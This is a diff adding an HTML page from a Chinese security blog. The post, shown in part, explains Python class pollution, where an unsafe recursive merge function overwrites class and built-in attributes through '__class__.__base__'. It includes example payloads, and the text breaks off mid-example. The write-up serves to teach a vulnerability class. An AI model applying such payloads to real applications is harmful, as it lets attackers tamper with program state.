@@ -1,0 +1,1541 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+    
+        <script src="/js/custom/love.min.js"></script>
+    
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Ko1sh1">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2023/12/25/blog_python原型链污染/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="Python原型链污染">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python 原型链污染">
+<meta property="og:url" content="http://example.com/2023/12/25/blog_python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Python原型链污染">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/blog/2293037-20230127104647995-145728452.png">
+<meta property="og:image" content="http://example.com/images/blog/2293037-20230127104705262-1430214027.png">
+<meta property="og:image" content="http://example.com/images/blog/2293037-20230127104721104-1224559985.png">
+<meta property="og:image" content="http://example.com/images/blog/2293037-20230127104734758-865825998.png">
+<meta property="og:image" content="http://example.com/images/blog/2293037-20230127104748903-1502385594.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240111195117344.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240111195247022.png">
+<meta property="og:image" content="http://example.com/images/blog/2293037-20230127104851348-904331972.png">
+<meta property="og:image" content="http://example.com/images/blog/2293037-20230127104901229-2020805748.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240111204529612.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240111205332589.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240111205403186.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240111205428286.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240111210325608.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240111210340963.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240111220619972.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240111221002379.png">
+<meta property="og:image" content="http://example.com/images/blog/2293037-20230127105049691-1067181145.png">
+<meta property="og:image" content="http://example.com/images/blog/2293037-20230127105056882-616179342.png">
+<meta property="og:image" content="http://example.com/images/blog/2293037-20230127105103715-1715379768.png">
+<meta property="og:image" content="http://example.com/images/blog/2293037-20230127105114125-1116989441.png">
+<meta property="og:image" content="http://example.com/images/blog/2293037-20230127105121312-663675572.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240111221205486.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240111221236591.png">
+<meta property="og:image" content="http://example.com/images/blog/2293037-20230127105144799-1907488324.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240111222844407.png">
+<meta property="og:image" content="http://example.com/images/blog/2293037-20230127105211530-505675831.png">
+<meta property="og:image" content="http://example.com/images/blog/2293037-20230127105219514-2070062201.png">
+<meta property="og:image" content="http://example.com/images/blog/2293037-20230127105225947-1658688272.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240111223832722.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240111224122360.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240111233418876.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240111233839788.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240111235354521.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240111235435916.png">
+<meta property="og:image" content="http://example.com/images/blog/2293037-20230127105320194-987334030.png">
+<meta property="og:image" content="http://example.com/images/blog/2293037-20230127105334386-1640095407.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240111235925462.png">
+<meta property="og:image" content="http://example.com/images/blog/2293037-20230127105350870-1852736359.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240112001153809.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240112001211302.png">
+<meta property="article:published_time" content="2023-12-24T23:11:34.000Z">
+<meta property="article:modified_time" content="2024-05-30T14:13:51.528Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="python 漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/blog/2293037-20230127104647995-145728452.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/avatar.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.jpg">
+    <meta name="theme-color" content="#FFA07A">
+    <link rel="shortcut icon" href="/images/avatar.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Python 原型链污染 -
+        
+        Ko1sh1&#39;s Blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+        
+            
+    
+            
+    
+            
+                
+                    <style> .home-banner-container .content div:nth-child(2) { justify-content: center !important;  } .home-banner-container .content div:nth-child(2) div:first-child { display: none !important; } </style>
+                
+    
+            
+                
+                    <script data-swup-reload-script src='/js/custom/jquery.min.js'></script>
+                
+    
+            
+                
+                    <script data-swup-reload-script src='/js/custom/text.js'></script>
+                
+    
+            
+                
+                    <link rel='stylesheet' href='/css/mouse.css'>
+                
+    
+
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+        <link href="/fonts/fonts.css" rel="stylesheet">
+    
+    
+    
+        <link href="/fonts/fonts.css" rel="stylesheet">
+    
+    
+        <link href="/fonts/fonts.css" rel="stylesheet">
+    
+
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":4,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#FFA07A","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"},"english":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":false,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/b.jpg","dark":"/images/b.jpg"},"title":"Ko1sh1's Blog","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#FF7569","dark":"#FF7569"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Ko1sh1","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null,"qq":"/images/qq.jpg"}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"雨に濡れた空気","artist":"春野杉卉","url":"/musics/雨に濡れた空気.mp3","cover":"/images/雨に濡れた空気.jpg"},{"name":"悋気","artist":"iwamizu","url":"/musics/悋気.mp3","cover":"/images/悋気.jpg"},{"name":"天空之城","artist":"StudioEIM","url":"/musics/天空之城.mp3","cover":"/images/天空之城.jpg"},{"name":"星茶会","artist":"灰澈","url":"/musics/星茶会.mp3","cover":"/images/星茶会.jpg"},{"name":"Talking to the Moon","artist":"MT1990","url":"/musics/Talking to the Moon.mp3","cover":"/images/Talking to the Moon.jpg"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":true,"color":{"left":"#87CEEB","right":"#FFB6C1","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Friends":"/links/"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"Photos":{"path":"/masonry","icon":"fa-regular fa-image"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/2/5 17:00:00"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+    
+        <script src="/js/custom/love.min.js"></script>
+    
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Ko1sh1&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    分类
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    关于
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/links/">
+                                                    师傅们
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/links/">师傅们</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>Tags</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/masonry"
+                        >
+                            <span>Photos</span>
+                            <i class="fa-regular fa-image fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    
+    
+        <script src="/js/custom/love.min.js"></script>
+    
+
+
+<div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="/images/blog11.jpg" alt="Python 原型链污染" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">Python 原型链污染</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/avatar.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Ko1sh1</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-12-25 07:11:34</span>
+        <span class="mobile">2023-12-25 07:11:34</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-05-30 22:13:51</span>
+            <span class="mobile">2024-05-30 22:13:51</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/python/">python</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/python-%E6%BC%8F%E6%B4%9E/">python 漏洞</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>6.6k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>30 分钟</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <p>就像<code>Javascript</code>中的原型链污染一样，这种攻击方式可以在<code>Python</code>中实现对类属性值的污染。需要注意的是，由于<code>Python</code>中的安全设定和部分特殊属性类型限定，并不是所有的类其所有的属性都是可以被污染的，不过可以肯定的，污染只对类的属性起作用，对于类方法是无效的。</p>
+<p>不过由于<code>Python</code>中变量空间的设置，实际上还能做到对全局变量中的属性实现污染。</p>
+<h2 id="合并函数"><a href="#合并函数" class="headerlink" title="合并函数"></a>合并函数</h2><p>就像<code>Javascript</code>的原型链污染一样，同样需要一个数值合并函数将特定值污染到类的属性当中，一个标准示例如下：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="污染尝试"><a href="#污染尝试" class="headerlink" title="污染尝试"></a>污染尝试</h2><p>由于<code>Python</code>中的类会继承父类中的属性，而类中声明（并不是实例中声明）的属性是唯一的，所以我们的目标就是这些在多个类、示例中仍然指向唯一的属性，如类中自定义属性及以<code>__</code>开头的内置属性等</p>
+<p>先以自定义属性为例子：</p>
+<h3 id="修改自定义属性"><a href="#修改自定义属性" class="headerlink" title="修改自定义属性"></a>修改自定义属性</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;koishi&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;shruti&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment"># koishi</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment"># koishi</span></span><br><span class="line"></span><br><span class="line">merge(payload, instance)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment"># shruti</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment"># shruti</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这里通过实例的 <code>.__class__.__base__</code>  修改了 secret 的值。</p>
+<p><strong>修改内置属性也是类似：</strong></p>
+<h3 id="修改内置属性"><a href="#修改内置属性" class="headerlink" title="修改内置属性"></a>修改内置属性</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;__str__&quot;</span>: <span class="string">&quot;shruti&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(father.__str__)</span><br><span class="line"><span class="comment"># &lt;slot wrapper &#x27;__str__&#x27; of &#x27;object&#x27; objects&gt;</span></span><br><span class="line">merge(payload, 